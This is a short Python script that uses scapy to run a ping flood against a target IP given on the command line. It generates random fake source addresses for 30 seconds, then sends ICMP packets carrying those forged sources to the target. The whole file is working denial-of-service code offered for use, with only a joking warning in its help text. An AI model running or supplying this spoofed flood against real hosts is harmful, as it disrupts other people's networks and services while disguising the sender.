#!/usr/bin/env python
import argparse
import random
import time
from scapy.all import *

time_out = 4
parser = argparse.ArgumentParser(description='this tool lets you perform a ping flood attack on an IP address. WARNING DO NOT DO ATTACK A COMPUTER THAT IS NOT YOURS. RUDE.')
parser.add_argument('-t', dest='target', type=str,help='single target IP adress')
args = parser.parse_args()
start = time.clock()
phonies = []
while time.clock()-start < 30:
    yi = random.randint(0,255)
    er = random.randint(0,255)
    san = random.randint(0,255)
    si = random.randint(0,255)
    bushiwo = str(yi)+"."+str(er)+"."+str(san)+"."+str(si)
    phonies.append(bushiwo)
for i in phonies:
	ping_packet=IP(src=str(i), dst=str(args.target))/ICMP()
	send(ping_packet)
